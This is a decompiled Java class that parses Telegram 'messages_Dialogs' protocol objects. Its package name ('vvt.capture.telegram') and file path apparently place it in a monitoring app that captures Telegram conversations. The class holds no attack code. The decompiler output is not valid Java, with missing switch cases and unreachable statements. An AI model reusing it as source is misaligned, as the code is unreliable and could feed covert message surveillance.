package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$messages_Dialogs
  extends TLObject
{
  public ArrayList chats;
  public int count;
  public ArrayList dialogs;
  public ArrayList messages;
  public ArrayList users;
  
  public TLRPC$messages_Dialogs()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.dialogs = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.messages = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.chats = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
  }
  
  public static messages_Dialogs TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in messages_Dialogs", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_messages_dialogs;
      ((TLRPC.TL_messages_dialogs)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_messages_dialogsSlice;
      ((TLRPC.TL_messages_dialogsSlice)localObject).<init>();
    }
    if (localObject != null) {
      ((messages_Dialogs)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (messages_Dialogs)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$messages_Dialogs.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */